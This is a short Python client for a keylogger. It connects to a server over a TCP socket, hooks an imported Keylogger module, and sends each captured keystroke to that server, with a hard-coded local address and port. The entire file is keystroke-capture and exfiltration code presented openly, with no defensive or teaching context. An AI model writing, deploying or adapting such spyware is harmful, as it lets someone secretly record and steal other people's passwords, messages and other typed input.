import socket
from keylogger import Keylogger


class Client:

    def __init__(self, ip, port):
        self.sock = socket.socket()
        self.connect_to_server(ip, port)
        self.keylogger = Keylogger(self.hook_func)

    def main(self):
        self.keylogger.start()

    def connect_to_server(self, ip, port):
        self.sock.connect((ip, port))
        print("CONNECTED")

    def hook_func(self, key):
        self.sock.send(f'{key}'.encode())
        print(f"SEND: {key}")


if __name__ == '__main__':
    client = Client('127.0.0.1', 8080)
    client.main()
